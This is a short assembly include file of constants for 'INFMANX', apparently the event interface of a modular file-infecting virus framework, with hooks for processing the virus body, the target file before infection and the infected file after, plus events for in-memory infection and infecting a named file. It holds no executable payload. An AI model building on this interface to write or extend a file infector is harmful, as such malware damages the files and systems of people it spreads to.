   INFMANX_VERSION         equ     1

   EV_INFMANX_BASE         equ     00003900h
   ; infector hooks:
   ; 1. before infection - process virus body
   ; 2. before infection - process file body
   ; 3. after  infection - process infected file body
   ; comment: all sizes (ECX on return) may be increased by a ~64k
   EV_INFMANX_BEFORE_VIRUS equ     EV_INFMANX_BASE+01h ; i: ESI,ECX  o: ECX
   EV_INFMANX_BEFORE_FILE  equ     EV_INFMANX_BASE+02h ; --//--
   EV_INFMANX_AFTER_FILE   equ     EV_INFMANX_BASE+03h ; --//--
   EV_INFMANX_INFECTINMEM  equ     EV_INFMANX_BASE+04h ; see .asm for details
   EV_INFMANX_DO_INFECT    equ     EV_INFMANX_BASE+05h ; i: EDX=filename
